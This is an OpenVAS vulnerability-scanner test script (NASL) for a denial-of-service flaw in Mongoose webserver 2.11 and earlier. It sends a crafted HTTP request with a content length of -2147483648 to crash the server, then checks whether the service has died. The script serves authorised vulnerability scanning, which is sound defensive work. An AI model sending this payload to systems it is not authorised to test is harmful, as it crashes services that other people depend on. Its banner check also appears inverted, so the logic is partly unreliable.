###############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_mongoose_websrv_cnt_len_dos_vuln.nasl 14 2013-10-27 12:33:37Z jan $
#
# Mongoose Webserver Content-Length Denial of Service Vulnerability
#
# Authors:
# Veerendra GG <veerendragg@secpod.com>
#
# Copyright:
# Copyright (c) 2010 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_solution = "No solution or patch is available as of 29th December, 2010. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to http://code.google.com/p/mongoose/";

tag_impact = "Successful exploitation will let the remote unauthenticated attackers to
  cause a denial of service or possibly execute arbitrary code.
  Impact Level: Application";
tag_affected = "Mongoose webserver version 2.11 and prior.";
tag_insight = "The flaw is due to the way Mongoose webserver handles request with a
  big nagitive 'Content-Length' causing application crash.";
tag_summary = "This host is running Mongoose Webserver and is prone to denial of service
  vulnerability.";

if(description)
{
  script_id(900268);
  script_version("$Revision: 14 $");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:33:37 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2010-12-31 07:04:16 +0100 (Fri, 31 Dec 2010)");
  script_tag(name:"cvss_base", value:"7.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:C");
  script_tag(name:"risk_factor", value:"High");
  script_name("Mongoose Webserver Content-Length Denial of Service Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://code.google.com/p/mongoose/");
  script_xref(name : "URL" , value : "http://www.johnleitch.net/Vulnerabilities/Mongoose.2.11.Denial.Of.Service/74");
  script_description(desc);
  script_summary("Check Mongoose Webserver is vulnerable to DoS");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2010 SecPod");
  script_family("Denial of Service");
  script_dependencies("find_service.nasl");
  script_require_ports("Services/www", 8080);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "summary" , value : tag_summary);
    script_tag(name : "solution" , value : tag_solution);
  }
  exit(0);
}

##
## The script code starts here
##

include("http_func.inc");
include("http_keepalive.inc");

## Get HTTP Port
port = get_http_port(default:8080);

## Check Port State
if(!get_port_state(port)){
  exit(0);
}

## Confirm the application before trying exploit
banner = get_http_banner(port: port);
if(!banner || "Server:" >< banner){
  exit(0);
}

if(http_is_dead(port:port))exit(0);

## Get Host Name or IP
host = get_host_name();
if(!host){
  exit(0);
}

## Construct attack request with big -ve Content-Length
attackReq = string( 'GET / HTTP/1.1\r\n',
                    'Host: ' + host + '\r\n',
                    'Content-Length: -2147483648\r\n\r\n' );

## Send crafted Request
res = http_keepalive_send_recv(port:port, data:attackReq);

sleep(5);

if(http_is_dead(port:port)){
  security_hole(port);
  exit(0);
}
